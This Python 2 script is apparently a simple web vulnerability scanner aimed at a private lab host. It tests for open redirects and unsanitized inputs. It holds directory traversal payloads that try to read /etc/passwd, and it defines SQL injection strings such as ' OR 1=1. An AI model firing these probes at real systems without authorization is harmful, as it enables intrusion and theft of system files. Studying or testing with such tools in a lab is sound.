import binascii
import copy
import difflib
import os
from requests import Request, Session
from pprint import pprint
from urlparse import urlparse

SQLI_PROBES = [
	"' OR 1=1;#",
	"' OR 1=1;--"
]

DIR_TRAVERSAL_PROBES = [
	"./" + "../" * 1 + "etc/passwd",
	"./" + "../" * 2 + "etc/passwd",
	"./" + "../" * 3 + "etc/passwd",
	"./" + "../" * 4 + "etc/passwd",
	"./" + "../" * 5 + "etc/passwd",
	"./" + "../" * 6 + "etc/passwd",
	"./" + "../" * 7 + "etc/passwd",
	"./" + "../" * 8 + "etc/passwd",
	"./" + "../" * 9 + "etc/passwd",
	".//" + "..//" * 1 + "/etc//passwd",
	".//" + "..//" * 2 + "/etc//passwd",
	".//" + "..//" * 3 + "/etc//passwd",
	".//" + "..//" * 4 + "/etc//passwd",
	".//" + "..//" * 5 + "/etc//passwd",
	".//" + "..//" * 6 + "/etc//passwd",
	".//" + "..//" * 7 + "/etc//passwd",
	".//" + "..//" * 8 + "/etc//passwd",
	".//" + "..//" * 9 + "/etc//passwd",
]

session = Session()

def scan(url, params):
	print("\n[*] Scanning: %s" % url)
	print("[*] Known Params:")
	pprint(params)

	# Check for open redirects
	# ========================
	# 1. Parameter value is contained in redirected URL
	print("[*] Testing for open redirects")
	for method in params.keys():
		method_params = params[method]
		request = Request(method, url, params=method_params)
		prepared_request = session.prepare_request(request)
		response = session.send(prepared_request)
		for history_response in response.history:
			if 300 <= history_response.status_code < 400:
				print("[!] Request history contains redirect: %s (%d)" % (history_response.url, history_response.status_code))
		for param, value in method_params.items():
			parsed_url = urlparse(response.url)
			if parsed_url.path.endswith(str(value)):
				print("[!] Redirected URL path ends with parameter value (%s=%s)" % (param, value))

	# Check for unsanitized inputs
	# ============================
	# 1. Using a few random values and checking if response changes
	#    We are looking for whether first delta changes (i.e. original input is a valid input)
	print("[*] Testing for unsanitized inputs")
	for method in params.keys():
		method_params = params[method]
		request = Request(method, url, params=method_params)
		prepared_request = session.prepare_request(request)
		response = session.send(prepared_request)
		prev_html = response.content
		first_delta = False
		for i in range(3):
			params_copy = copy.deepcopy(method_params)
			for key in params_copy.keys():
				params_copy[key] = binascii.hexlify(os.urandom(20))
			request = Request(method, url, params=params_copy)
			prepared_request = session.prepare_request(request)
			response = session.send(prepared_request)
			delta = difflib.context_diff(prev_html, response.content)
			print("[*] Listing page HTML delta")
			count = 0
			for line in delta:
				print(line)
				count += 1
			if i == 0 and count > 0:
				first_delta = True
			print("[*] Delta lines: %d" % count)
			prev_html = response.content

		if first_delta:
			print("[*] Non-zero first delta, trying directory traversal probes")
			for param in method_params.keys():
				params_copy = copy.deepcopy(method_params)
				for probe in DIR_TRAVERSAL_PROBES:
					params_copy[param] = probe
					request = Request(method, url, params=params_copy)
					prepared_request = session.prepare_request(request)
					response = session.send(prepared_request)
					if "root:x:0:0" in response.content:
						print("[!] Found directory traversal indication using parameter value (%s=%s)" % (param, probe))
						break


if __name__ == '__main__':
	scan('http://192.168.56.101/openredirect/openredirect.php', {'GET': {'redirect': 'success.html'}})
	scan('http://192.168.56.101/sqli/sqli.php', {'POST': {'username': None}})
	scan('http://192.168.56.101/directorytraversal/directorytraversal.php', {'GET': {'ascii': 'angry.ascii'}})